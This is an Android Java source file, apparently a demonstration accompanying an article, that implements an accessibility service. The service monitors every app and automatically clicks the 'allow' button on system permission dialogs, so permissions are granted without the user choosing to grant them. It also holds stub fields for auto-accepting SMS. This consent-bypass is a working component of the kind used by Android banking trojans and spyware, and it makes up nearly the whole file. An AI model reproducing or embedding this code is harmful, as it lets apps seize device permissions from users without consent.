package com.article.funwithaccessibility;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.util.List;

public class MyAccessibilityService extends AccessibilityService {

    private static boolean started;
    private static boolean smsAutoAccept;
    private static long timeout;
    private static String smsAutoAcceptPackageName;

    public static boolean GetStarted() {
        return started;
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent accessibilityEvent) {
        AccessibilityNodeInfo rootInActiveWindow;
        try {
            if (!(accessibilityEvent.getClassName() == null || (rootInActiveWindow = getRootInActiveWindow()) == null || accessibilityEvent.getPackageName() == null)) {
                String charSequence = accessibilityEvent.getPackageName().toString();
                if (charSequence.equals("com.google.android.permissioncontroller") || rootInActiveWindow.toString().contains("com.google.android.permissioncontroller") || accessibilityEvent.getPackageName().toString().contains("com.google.android.permissioncontroller")) {
                    AutoAcceptPerms(rootInActiveWindow);
                    return;
                }
            }
        } catch (Exception e) {
            Log.d("Error", "Error Occurred");
        }
    }

    @Override
    public void onInterrupt() {

    }

    @Override
    protected void onServiceConnected() {
        super.onCreate();

        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        // Set the type of events that this service wants to listen to. Others
        // won't be passed to this service.
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_CLICKED | AccessibilityEvent.TYPE_VIEW_FOCUSED | AccessibilityEvent.CONTENT_CHANGE_TYPE_CONTENT_DESCRIPTION |
        AccessibilityEvent.CONTENT_CHANGE_TYPE_DRAG_CANCELLED | AccessibilityEvent.CONTENT_CHANGE_TYPE_DRAG_DROPPED | AccessibilityEvent.CONTENT_CHANGE_TYPE_DRAG_STARTED |
        AccessibilityEvent.CONTENT_CHANGE_TYPE_PANE_APPEARED | AccessibilityEvent.CONTENT_CHANGE_TYPE_SUBTREE | AccessibilityEvent.CONTENT_CHANGE_TYPE_CONTENT_DESCRIPTION |
        AccessibilityEvent.CONTENT_CHANGE_TYPE_PANE_DISAPPEARED | AccessibilityEvent.CONTENT_CHANGE_TYPE_PANE_TITLE | AccessibilityEvent.CONTENT_CHANGE_TYPE_TEXT |
        AccessibilityEvent.CONTENT_CHANGE_TYPE_UNDEFINED | AccessibilityEvent.CONTENTS_FILE_DESCRIPTOR | AccessibilityEvent.INVALID_POSITION | AccessibilityEvent.TYPE_ANNOUNCEMENT |
        AccessibilityEvent.TYPE_VIEW_ACCESSIBILITY_FOCUSED | AccessibilityEvent.WINDOWS_CHANGE_FOCUSED | AccessibilityEvent.WINDOWS_CHANGE_ACCESSIBILITY_FOCUSED | AccessibilityEvent.WINDOWS_CHANGE_TITLE;

        // If you only want this service to work with specific applications, set their
        // package names here. Otherwise, when the service is activated, it will listen
        // to events from all applications.
        // info.packageNames = new String[]{"com.example.android.myFirstApp", "com.example.android.mySecondApp"};

        // Set the type of feedback your service will provide.
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK | AccessibilityServiceInfo.FEEDBACK_SPOKEN | AccessibilityServiceInfo.FEEDBACK_AUDIBLE;
        // Default services are invoked only if no package-specific ones are present
        // for the type of AccessibilityEvent generated. This service *is*
        // application-specific, so the flag isn't necessary. If this was a
        // general-purpose service, it would be worth considering setting the
        // DEFAULT flag.

        info.flags = AccessibilityServiceInfo.DEFAULT | AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS | AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS | AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;

        //info.notificationTimeout = 100;

        this.setServiceInfo(info);
    }

    private boolean AutoAcceptPerms(AccessibilityNodeInfo accessibilityNodeInfo) {
        AccessibilityNodeInfo GetFirstNode;
        if (Utils.HasPermissions(this, ProConfig.PERMISSIONS) || (GetFirstNode = GetFirstNode(new String[]{"com.android.permissioncontroller:id/permission_allow_button", "com.android.packageinstaller:id/permission_allow_button"}, accessibilityNodeInfo, false)) == null) {
            return false;
        }
        GetFirstNode.performAction(AccessibilityNodeInfo.ACTION_CLICK);
        return true;
    }

    public static void SetSmsAutoAccept(boolean z, String str) {
        smsAutoAccept = z;
        timeout = System.currentTimeMillis();
        smsAutoAcceptPackageName = str;
    }

    private AccessibilityNodeInfo GetFirstNode(String[] strArr, AccessibilityNodeInfo accessibilityNodeInfo, boolean z) {
        for (String str : strArr) {
            AccessibilityNodeInfo GetFirstNode = GetFirstNode(str, accessibilityNodeInfo, z);
            if (GetFirstNode != null) {
                return GetFirstNode;
            }
        }
        return null;
    }

    private AccessibilityNodeInfo GetFirstNode(String str, AccessibilityNodeInfo accessibilityNodeInfo, boolean z) {
        List<AccessibilityNodeInfo> list;
        if (z) {
            list = accessibilityNodeInfo.findAccessibilityNodeInfosByText(str);
        } else {
            list = accessibilityNodeInfo.findAccessibilityNodeInfosByViewId(str);
        }
        if (list.size() > 0) {
            return list.get(0);
        }
        return null;
    }

}
